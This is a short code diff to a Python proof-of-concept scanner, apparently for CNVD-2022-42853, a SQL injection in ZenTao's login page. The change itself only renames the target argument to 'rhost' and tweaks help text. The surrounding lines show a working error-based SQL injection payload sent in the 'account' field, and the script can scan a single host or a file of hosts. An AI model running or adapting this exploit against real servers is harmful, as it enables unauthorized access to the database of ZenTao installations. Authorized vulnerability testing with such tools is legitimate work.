@@ -10,8 +10,8 @@ class attack():
             return True
         else:
             return False
-    def attack_one(self, ipaddress):
-        httpline = "http://" + ipaddress.strip() + "/zentao/user-login.html"
+    def attack_one(self, rhost):
+        httpline = "http://" + rhost.strip() + "/zentao/user-login.html"
         payload = {"account": "admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"}
         headers = {"Referer": httpline}
         try:
@@ -57,21 +57,21 @@ class attack():
 if (__name__ == "__main__"):
     parser = argparse.ArgumentParser(description="CNVD-2022-42853 Poc by ccj")
     parser.add_argument(
-        '-ip', '--ipaddress', type=str,
-        help='Please input url to scan.'
+        '-rh', '--rhost', type=str, metavar="",
+        help='Please input host to scan.'
     )
     parser.add_argument(
-        '-f', '--file', type=argparse.FileType('r'),
+        '-f', '--file', type=argparse.FileType('r'), metavar="",
         help='Please input file path to scan.'
     )
     parser.add_argument(
-        '-o', '--outfile',
+        '-o', '--outfile', metavar="",
         help="Please input path for output file."
     )
     args = parser.parse_args()
-    if args.ipaddress:
+    if args.rhost:
         run = attack()
-        run.attack_one(args.ipaddress)
+        run.attack_one(args.rhost)
         exit()
     if args.file:
         run = attack()
